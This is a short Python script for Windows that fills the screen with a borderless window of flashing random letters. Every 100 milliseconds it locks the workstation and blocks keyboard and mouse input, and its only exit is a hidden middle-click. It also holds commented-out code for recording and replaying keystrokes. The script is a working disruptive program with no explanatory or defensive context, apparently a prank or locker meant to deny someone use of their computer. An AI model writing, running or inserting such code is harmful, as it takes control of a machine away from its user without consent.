import tkinter as tk
from random import seed, choice
from string import ascii_letters
from ctypes import *
import os
import win32process
import keyboard

colors = ('red', 'yellow', 'green', 'cyan', 'blue', 'magenta')
seed(42)

def do_stuff():
    windll.user32.LockWorkStation()
    windll.user32.BlockInput(True)
    # rk = keyboard.record(until='Esc')
    s = ''.join([choice(ascii_letters) for i in range(10)])
    color = choice(colors)
    l.config(text=s, fg=color)

    root.after(100, do_stuff)
    # keyboard.play(rk, speed_factor=1)



root = tk.Tk()
root.wm_overrideredirect(True)
root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))
root.bind("<Button-2>", lambda evt: root.destroy())

l = tk.Label(text='', font=("Helvetica", 60))
l.pack(expand=True)

do_stuff()


root.mainloop()
